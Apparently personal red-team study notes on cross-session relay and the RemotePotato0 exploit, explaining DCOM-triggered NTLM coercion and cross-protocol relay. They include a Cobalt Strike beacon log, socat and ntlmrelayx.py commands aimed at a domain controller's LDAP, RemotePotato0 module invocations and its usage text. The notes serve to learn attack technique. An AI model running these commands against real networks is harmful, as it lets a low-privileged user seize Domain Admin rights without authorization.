# Cross-Session Relay
Cross-session relay (sometimes called cross-session activation) = triggering NTLM authentication from a different logon session on the same machine, then relaying that. It’s the mechanism RemotePotato0 uses: DCOM lets a low-privileged user in one Windows session (say session 0, reached via a WinRM/SSH shell) trigger the DCOM activation service to make a privileged user logged into a different session (session 1, e.g. a domain admin) send its NTLM auth toward an attacker-chosen RPC endpoint. The attacker never touches that privileged user’s session directly — DCOM just reaches across sessions on their behalf.

![image.png](Cross-Session%20Relay/image.png)

By running the **ps** command, something odd… There’s someone else logged in to the machine (you can see by the highlighted different session ID number). To enumerate this, we can use **qwinsta**.

When you connect over WinRM (for example with Evil‑WinRM), you’re given a Network logon token (LogonType 3). Network logons:

- Don’t create an Interactive or RemoteInteractive (RDP) session on the host.
- By default, are subject to UAC remote restrictions
(LocalAccountTokenFilterPolicy=0), which strip out most administrative
privileges from your token.

Because **qwinsta** and query user rely on the 
Terminal Services APIs (WTSEnumerateSessions/WTSQuerySessionInformation)
 to list sessions, they only work when your process is in a true TS 
session with the right privileges. A Network logon token has no such 
session context, so you get:

```bash
qwinsta.exe : No session exists for *
```

You’re asking Windows to perform a NewCredentials logon (LogonType 9). NewCredentials:

- Clones your local interactive session token for local access
- Uses the supplied credentials only for outbound network connections

```bash
[08/24 10:58:53] beacon> execute-assembly /home/vin/hacking/tools/precompiled-binaries/LateralMovement/RunasCs.exe x x "qwinsta" -l 9
[08/24 10:58:54] [*] Tasked beacon to run .NET program: RunasCs.exe x x "qwinsta" -l 9
[08/24 10:58:54] [+] host called home, sent: 161056 bytes
[08/24 10:58:58] [+] received output:

 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE 
>services                                    0  Disc                        
 console           tbrady                    1  Active                      
```

Because your process now has a genuine TS session context with full privileges, qwinsta can enumerate session 0 (services) and session 1 (console) as expected, as you can see from the screenshot below:

# RemotePotato0

**UPDATE 21-10-2022: The main exploit scenario RPC->LDAP of RemotePotato0 has been fixed. More details at -->** [https://twitter.com/splinter_code/status/1583555613950255104](https://twitter.com/splinter_code/status/1583555613950255104)

Just another "Won't Fix" Windows Privilege Escalation from User to Domain Admin.

RemotePotato0 is an exploit that allows you to escalate your privileges from a generic User to Domain Admin.

## RemotePotato0 — what is actually happening?

RemotePotato0 is essentially an **NTLM coercion + cross-protocol relay** technique.

The important chain is:

**DCOM → NTLM authentication → intercept Type 1 → protocol conversion → relay to another service → authenticate as the coerced user**

The attack is interesting because the attacker isn't necessarily stealing the user's password. Instead, they cause a logged-on user—potentially a **Domain Admin**—to authenticate to an attacker-controlled endpoint.

### 1. DCOM is the starting point

**DCOM (Distributed Component Object Model)** allows Windows components to communicate using RPC/DCOM mechanisms.

RemotePotato0 abuses the way the **DCOM activation service** handles authentication.

Conceptually:

```
Attacker
   |
   | Abuse DCOM activation
   v
Target Windows machine
   |
   | "Authenticate to me"
   v
Privileged logged-on user
```

The important condition is:

> A useful/privileged user must already be logged onto the target machine.
> 

If the Domain Admin is logged in, the attack attempts to make Windows perform an NTLM authentication using that user's security context.

"I'm Domain Admin, and I'm going to authenticate to this server."

# 2. Why the logged-on user matters

Instead, they are trying to make Windows say:

> "I'm Domain Admin, and I'm going to authenticate to this server."
> 

### NTLM authentication

At a high level:

```
Client                         Server
  |                              |
  |-------- NTLM Type 1 -------->|
  |                              |
  |<------- NTLM Type 2 ---------|
  |                              |
  |-------- NTLM Type 3 -------->|
```

The messages are generally:

- **Type 1** — Negotiate
- **Type 2** — Challenge
- **Type 3** — Authenticate

The Type 3 message contains the NTLM response derived from the user's secret and the server challenge.

Therefore, when people say:

> "steal the NTLMv2 hash"
> 

be careful with the terminology.

You're normally dealing with an **NTLM challenge-response**, not simply obtaining the user's plaintext password or an NT hash that can automatically be cracked.

# 3. Triggering the authentication

RemotePotato0 abuses DCOM/RPC behavior to cause the logged-on user to authenticate.

Think of the attack as:

```
[Attacker]
     |
     | DCOM/RPC interaction
     v
[Target machine]
     |
     | DCOM activation
     v
[Logged-on privileged user]
     |
     | NTLM authentication
     v
[Attacker-controlled endpoint]
```

The attacker wants the authentication to originate from the target machine **under the security context of the logged-on user**.

# 4. The cross-protocol part

The authentication is initially associated with **RPC/DCOM**, but the attacker wants to use that authentication against another protocol/service.

```bash
DCOM / RPC
    |
    | NTLM authentication
    v
Attacker-controlled relay
    |
    | Convert/repackage authentication
    v
HTTP-based NTLM service
```

This is what is meant by:

> **cross-protocol NTLM relay**
> 

The attacker is essentially acting as a translator/proxy.

```
Coerce authentication
        ↓
Capture NTLM exchange
        ↓
Relay authentication
        ↓
Target service accepts authentication
```

That is why **NTLM relay can be more powerful than simply cracking a captured challenge-response**.

The Type 1 message is the beginning of the NTLM negotiation.

Conceptually:

```
Target / victim
      |
      | Type 1
      v
Attacker relay
      |
      | forwards/uses negotiation
      v
Target service
```

The relay infrastructure then facilitates the rest of the NTLM exchange.

A useful mental model is:

```bash
Victim                         Relay                         Target
  |                              |                              |
  |------ Type 1 --------------->|                              |
  |                              |------ Type 1 ---------------->|
  |                              |<----- Type 2 -----------------|
  |<-----------------------------|                              |
  |                              |                              |
  |------ Type 3 --------------->|                              |
  |                              |------ Type 3 ---------------->|
  |                              |                              |
  |                              |       Authentication          |
```

**The relay extracts the NTLM authentication exchange from the original protocol context and makes it usable in another protocol context.**

This is why it's called **cross-protocol relay**.

## Examples

Attacker machine (10.0.0.20)

Victim machine (10.0.0.45)

Victim Domain Controller (10.0.0.10)

#### Module 0 - Rpc2Http cross protocol relay server + potato trigger

```
sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.0.0.45:9999 &
sudo ntlmrelayx.py -t ldap://10.0.0.10 --no-wcf-server --escalate-user normal_user
```

**Note: if you are on Windows Server <= 2016 you 
can avoid the network redirector (socat) because the oxid resolution can
 be performed locally.**

```
query user
.\RemotePotato0.exe -m 0 -r 10.0.0.20 -x 10.0.0.20 -p 9999 -s 1
```

#### Module 1 - Rpc2Http cross protocol relay server

```
.\RemotePotato0.exe -m 1 -l 9997 -r 10.0.0.20
```

```
rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
```

#### Module 2 - Rpc capture (hash) server + potato trigger

```
query user
.\RemotePotato0.exe -m 2 -s 1
```

#### Module 3 - Rpc capture (hash) server

```
.\RemotePotato0.exe -m 3 -l 9997
```

```
rpcping -s 127.0.0.1 -e 9997 -a connect -u ntlm
```

## Usage

```

        RemotePotato0
        @splinter_code & @decoder_it

Mandatory args:
-m module
        Allowed values:
        0 - Rpc2Http cross protocol relay server + potato trigger (default)
        1 - Rpc2Http cross protocol relay server
        2 - Rpc capture (hash) server + potato trigger
        3 - Rpc capture (hash) server

Other args: (someone could be mandatory and/or optional based on the module you use)
-r Remote HTTP relay server ip
-t Remote HTTP relay server port (Default 80)
-x Rogue Oxid Resolver ip (default 127.0.0.1)
-p Rogue Oxid Resolver port (default 9999)
-l RPC Relay server listening port (Default 9997)
-s Session id for the Cross Session Activation attack (default disabled)
-c CLSID (Default {5167B42F-C111-47A1-ACC4-8EABE61B0B54})
```

##